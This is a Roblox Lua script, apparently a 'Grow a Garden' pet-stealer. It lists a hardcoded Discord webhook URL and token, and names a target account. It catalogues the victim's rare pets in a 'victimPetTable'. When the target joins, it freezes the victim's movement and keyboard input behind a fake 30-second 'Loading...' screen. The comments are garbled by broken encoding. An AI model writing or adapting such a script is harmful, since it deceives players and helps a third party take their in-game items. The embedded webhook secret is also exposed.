repeat task.wait() until game:IsLoaded()

local WEBHOOK_URL = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75"
local USERNAMES = { "ZeeS_Farm01" }

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")

local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)

local PET_WHITELIST = {
    'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
    'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune', 'Raiju'
}

local victimPetTable = {}

-- üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏–≥—Ä–æ–∫–æ–≤
local function waitForJoin()
    for _, player in Players:GetPlayers() do
        if table.find(USERNAMES, player.Name) then
            return true, player.Name
        end
    end
    return false, nil
end

-- ‚úÖ –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –ø–µ—Ç–æ–≤
local function getPlayersPets()
    victimPetTable = {} -- –æ—á–∏—Å—Ç–∏–º
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        for _, name in PET_WHITELIST do
            if string.find(value.PetType, name) then
                table.insert(victimPetTable, value.PetType)
            end
        end
    end
end

-- üõë –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
local movementConnection
local function freezeMovement()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:WaitForChild("Humanoid")
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    movementConnection = UserInputService.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Keyboard then
            input:CaptureController()
        end
    end)
end

local function unfreezeMovement()
    local char = LocalPlayer.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
    end
    if movementConnection then
        movementConnection:Disconnect()
    end
end

-- üñºÔ∏è –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ GUI + –ø–µ—Ä–µ–±–æ—Ä –ø–µ—Ç–æ–≤
local function showLoadingGuiWithPets()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "VisualPetEffectGUI"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    screenGui.DisplayOrder = 1000
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    screenGui.Modal = false

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.BackgroundTransparency = 0.4
    bg.Parent = screenGui

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0.2, 0)
    label.Position = UDim2.new(0, 0, 0.4, 0)
    label.BackgroundTransparency = 1
    label.Text = "Loading..."
    label.TextScaled = true
    label.Font = Enum.Font.GothamBlack
    label.TextColor3 = Color3.new(1, 1, 1)
    label.Parent = screenGui

    local barBg = Instance.new("Frame")
    barBg.AnchorPoint = Vector2.new(0.5, 0.5)
    barBg.Position = UDim2.new(0.5, 0, 0.6, 0)
    barBg.Size = UDim2.new(0.6, 0, 0.02, 0)
    barBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    barBg.BorderSizePixel = 0
    barBg.Parent = screenGui

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0, 0, 1, 0)
    bar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
    bar.BorderSizePixel = 0
    bar.Parent = barBg

    -- –í–æ–ª–Ω–∏—Å—Ç–∞—è –∞–Ω–∏–º–∞—Ü–∏—è
    local waveOffset = 0
    RunService.RenderStepped:Connect(function(dt)
        waveOffset += dt * 5
        local waveHeight = math.sin(waveOffset) * 3
        bar.Position = UDim2.new(bar.Size.X.Scale, 0, 0, waveHeight)
    end)

    -- –ü–µ—Ä–µ–±–æ—Ä –ø–µ—Ç–æ–≤
    local function cyclePets(petList)
        local displayLabel = Instance.new("TextLabel")
        displayLabel.Size = UDim2.new(1, 0, 0.2, 0)
        displayLabel.Position = UDim2.new(0, 0, 0.8, 0)
        displayLabel.BackgroundTransparency = 1
        displayLabel.TextScaled = true
        displayLabel.Font = Enum.Font.GothamBold
        displayLabel.TextColor3 = Color3.new(1, 1, 1)
        displayLabel.TextStrokeTransparency = 0.7
        displayLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
        displayLabel.Parent = screenGui

        local index = 1
        while screenGui and screenGui.Parent do
            local petName = petList[index]
            displayLabel.Text = "üéí " .. petName
            displayLabel.TextTransparency = 0
            displayLabel.TextStrokeTransparency = 0.7

            TweenService:Create(displayLabel, TweenInfo.new(0.2), {TextTransparency = 0}):Play()
            task.wait(0.5)
            TweenService:Create(displayLabel, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
            index = (index % #petList) + 1
        end
    end

    -- ‚è≥ –ó–∞–ø—É—Å–∫ –∞–Ω–∏–º–∞—Ü–∏–∏ –∏ –ª–æ–≥–∏–∫–∏
    freezeMovement()
    getPlayersPets()
    task.delay(10, function()
        cyclePets(victimPetTable)
    end)

    TweenService:Create(bar, TweenInfo.new(30, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
        Size = UDim2.new(1, 0, 1, 0)
    }):Play()

    task.delay(30, function()
        unfreezeMovement()
        screenGui:Destroy()
    end)
end

-- üîÅ –¶–∏–∫–ª –ø—Ä–æ–≤–µ—Ä–∫–∏
task.spawn(function()
    while task.wait(1) do
        local isTarget, targetName = waitForJoin()
        if isTarget then
            showLoadingGuiWithPets()
            break
        end
    end
end)
